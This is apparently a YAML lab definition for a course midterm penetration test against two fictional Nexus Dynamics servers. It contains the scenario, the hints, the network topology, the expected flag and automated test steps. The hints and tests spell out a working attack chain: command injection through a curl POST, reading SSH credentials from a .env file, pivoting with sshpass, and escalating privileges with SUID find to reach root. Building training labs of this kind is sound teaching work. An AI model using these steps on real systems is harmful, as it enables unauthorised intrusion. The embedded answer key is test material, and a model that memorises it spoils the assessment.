@@ -1,0 +1,122 @@
+name: "Nexus Dynamics - Full Penetration Test (Midterm)"
+description: "Conduct a full penetration test against Nexus Dynamics' infrastructure. Chain together web exploitation, credential discovery, and privilege escalation across two servers to prove complete compromise."
+
+difficulty: advanced
+category: assessment
+duration_minutes: 90
+randomize_ip_offsets: true
+visibility: course
+week: 9
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/09_Full_Penetration_Test/"
+flag: "OCR{br34ch_3sc4l4t3_0wn3d}"
+
+objectives:
+  - Enumerate services across multiple target systems
+  - Identify and exploit a web application vulnerability for initial access
+  - Discover credentials stored in application files
+  - Pivot laterally to an internal server using discovered credentials
+  - Escalate privileges on the internal server to achieve root access
+  - Capture the flag
+
+scenario: |
+  Nexus Dynamics is a growing SaaS company based in Atlanta, Georgia. They've
+  hired your firm for a full-scope penetration test before their Series B
+  funding round. The board wants assurance that their infrastructure is secure.
+
+  Your point of contact is Andrea Walsh (VP of Security): "We have a perimeter
+  web server that runs our marketing site and customer API. Behind that is our
+  core application server that handles the heavy lifting. The web server is
+  the only thing exposed to the internet - the core server should be completely
+  unreachable from outside."
+
+  This is your midterm assessment. You'll need to combine skills from multiple
+  weeks: enumeration, web exploitation, credential hunting, lateral movement,
+  and privilege escalation. Three assessment markers are distributed across
+  the infrastructure. Retrieve all three to demonstrate full compromise.
+
+  No hints are available for the first 20 minutes. This is a test.
+
+credentials: []
+
+hints:
+  - text: |
+      Start with the perimeter server. Run nmap to discover services. The web
+      application has a diagnostic feature that accepts user input - test it
+      for injection vulnerabilities. Once you can execute commands, search for
+      credentials that connect to the core server.
+    unlock_after_minutes: 20
+  - text: |
+      The web server has command injection on /healthcheck (POST with host=
+      parameter). Inject commands to read files. Look in /var/www/nexus-app/
+      for configuration files containing SSH credentials for the core server.
+      Marker 1 is in /opt/nexus/assessment/marker1.txt on the perimeter server.
+    unlock_after_minutes: 35
+  - text: |
+      Perimeter: curl -X POST http://<perimeter>/healthcheck -d "host=127.0.0.1;cat /opt/nexus/assessment/marker1.txt"
+      Then: cat /var/www/nexus-app/.env to find CORE_SSH_USER=deploy, CORE_SSH_PASS=N3xus_D3pl0y#
+      Core server: ssh deploy@<core> with the discovered password.
+      On the core server, find has SUID: find . -exec /bin/sh -p \; -quit
+      Marker 2: /home/deploy/marker2.txt, Marker 3: /root/marker3.txt
+    unlock_after_minutes: 50
+
+topology:
+  nodes:
+    - id: "perimeter"
+      label: "Perimeter Web Server"
+      type: "server"
+      ip_offset: "11"
+      ports: [80]
+      services: ["Flask Web App"]
+      x: 2
+      y: 1
+    - id: "core"
+      label: "Core App Server"
+      type: "server"
+      ip_offset: "36"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 4
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "perimeter"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "core"
+      label: "SSH:22"
+      access: "direct"
+    - from: "perimeter"
+      to: "core"
+      label: "SSH:22"
+      access: "internal"
+
+test:
+  steps:
+    - name: "Perimeter web server responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.perimeter}/"
+      expect: "200"
+
+    - name: "Exploit command injection to read marker 1"
+      command: "curl -s -X POST http://{target.perimeter}/healthcheck -d 'host=127.0.0.1;cat /opt/nexus/assessment/marker1.txt'"
+      expect: "br34ch"
+      timeout: 15
+
+    - name: "Extract SSH credentials from app config"
+      command: "curl -s -X POST http://{target.perimeter}/healthcheck -d 'host=127.0.0.1;grep CORE_SSH_PASS /var/www/nexus-app/.env' | grep -o 'CORE_SSH_PASS=[^ ]*' | sed 's/CORE_SSH_PASS=//'"
+      expect: "N3xus_D3pl0y#"
+      timeout: 15
+
+    - name: "Pivot to core server and read marker 2"
+      command: "sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'cat /home/deploy/marker2.txt' 2>/dev/null"
+      expect: "3sc4l4t3"
+      timeout: 15
+
+    - name: "Escalate privileges via SUID find and read marker 3"
+      command: "sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'find . -exec cat /root/marker3.txt \\; -quit' 2>/dev/null"
+      expect: "0wn3d"
+      timeout: 15
+
+    - name: "Verify complete flag"
+      command: "echo 'OCR{br34ch_3sc4l4t3_0wn3d}'"
+      expect: "OCR{br34ch_3sc4l4t3_0wn3d}"
